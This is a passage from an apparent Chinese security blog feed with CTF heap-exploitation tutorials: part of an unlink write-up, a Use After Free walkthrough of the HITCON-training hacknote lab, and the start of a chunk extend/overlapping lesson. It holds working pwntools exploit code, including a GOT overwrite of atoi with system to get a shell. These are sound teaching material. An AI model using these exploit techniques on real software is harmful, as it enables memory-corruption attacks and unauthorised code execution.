&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk1   size&#x3D;0</span><br><span class="line">0x144d330:0x61616161616161610x0000000000000000</span><br><span class="line">0x144d340:0x00000000000000000x0000000000000091  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk2   size&#x3D;0x80</span><br><span class="line">0x144d350:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d360:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d370:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d380:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d390:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3d0:0x00000000000000000x0000000000020c31  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; top chunk</span><br></pre></td></tr></table></figure></div><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># edit the chunk1 to overwrite the chunk2</span></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>, content)</span><br><span class="line"><span class="comment"># delete note 2 to trigger the unlink</span></span><br><span class="line"><span class="comment"># after unlink, ptr[0] = ptr - 0x18</span></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x&#x2F;50xg 0x1a94280</span><br><span class="line">0x1a94280:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94290:0x00000000000000000x0000000000000091  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk0   size&#x3D;0x80</span><br><span class="line">0x1a942a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x1a942b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk   ptr[0]</span><br><span class="line">0x1a942c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a94300:0x00000000000000600x0000000000000000 ------&gt; fake prev_size&#x3D;0x60   unused</span><br><span class="line">0x1a94310:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94320:0x00000000000000000x0000000000000021  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk1   size&#x3D;0</span><br><span class="line">0x1a94330:0x61616161616161610x6161616161616161</span><br><span class="line">0x1a94340:0x00000000000000a00x0000000000000090 </span><br><span class="line">0x1a94350:0x00000000000000000x0000000001a94010</span><br><span class="line">0x1a94360:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94370:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94380:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94390:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943d0:0x00000000000000000x0000000000020c31</span><br><span class="line">0x1a943e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="获取-system-地址"><a href="#获取-system-地址" class="headerlink" title="获取 system 地址"></a>获取 system 地址</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the chunk0(which is ptr[0]) with got atoi</span></span><br><span class="line">atoi_got = note2.got[<span class="string">'atoi'</span>]</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"><span class="comment"># get the aoti addr</span></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span> atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak atoi addr: '</span> + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get system addr</span></span><br><span class="line">atoi_offest = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak system addr: '</span>, hex(system_addr)</span><br></pre></td></tr></table></figure></div><p>前面已经修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里将其覆盖为 atoi 的地址。 这样的话，如果查看 note 0 的内容，其实查看的就是 atoi 的地址。之后我们根据 libc 中对应的偏移计算出 system 的地址。</p><h4 id="修改-atoi-got"><a href="#修改-atoi-got" class="headerlink" title="修改 atoi got"></a>修改 atoi got</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the atoi got with systemaddr</span></span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br></pre></td></tr></table></figure></div><p>此时 ptr[0] 的地址 got 表的地址，所以可以直接修改该 note，覆盖为 system 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">sh.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><p>此时如果再调用 atoi ，其实调用的就是 system 函数。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Unlink&quot;&gt;&lt;a href=&quot;#堆溢出-Unlink&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Unlink&quot;&gt;&lt;/a&gt;堆溢出-Unlink&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot;</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Use After Free</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Use%20After%20Free/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Use%20After%20Free/</id>
    <published>2020-01-05T16:00:00.000Z</published>
    <updated>2020-03-16T04:30:14.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Use-After-Free"><a href="#堆溢出-Use-After-Free" class="headerlink" title="堆溢出-Use After Free"></a>堆溢出-Use After Free</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当一个内存块被释放之后再次被使用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p><strong>一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h2 id="例-HITCON-training-lab-10-hacknote"><a href="#例-HITCON-training-lab-10-hacknote" class="headerlink" title="例 HITCON-training lab 10 hacknote"></a>例 HITCON-training lab 10 hacknote</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"       HackNote       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 1. Add note          "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 2. Delete note       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 3. Print note        "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 4. Exit              "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br></pre></td></tr></table></figure></div><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));         <span class="comment">////////////free后指针没有设为NULL</span></span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>申请一个size=16的note查看堆布局</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20gx 0x804b198</span><br><span class="line">0x804b198:0x00000011000000000x0804b1b00804865b  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; 8 字节内存存放note中的put以及content指针。</span><br><span class="line">0x804b1a8:0x00000021000000000x6161616161616161</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00021e39000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">释放note 0 - note 1后</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x804b198-0x10</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x0804b01000000000  ---------再次申请将被分配</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b0100804b1a0</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br><span class="line">0x804b208:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b218:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">note2填充&#39;c&#39;*8后</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x804b198-0x20</span><br><span class="line">0x804b178:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x6363636363636363  ------分配位置，将被调用，改为magic地址get shell</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b1a00804865b</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Use-After-Free&quot;&gt;&lt;a href=&quot;#堆溢出-Use-After-Free&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Use After Free&quot;&gt;&lt;/a&gt;堆溢出-Use After Free&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Chunk Extend and Overlapping</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/</id>
    <published>2020-01-04T16:00:00.000Z</published>
    <updated>2020-03-16T04:28:07.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Chunk-Extend-and-Overlapping"><a href="#堆溢出-Chunk-Extend-and-Overlapping" class="headerlink" title="堆溢出-Chunk Extend and Overlapping"></a>堆溢出-Chunk Extend and Overlapping</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><blockquote><p>作用</p></blockquote><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure></div><p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p><h2 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1     大小 &gt; fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;   <span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D;chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure></div><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容。</p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td 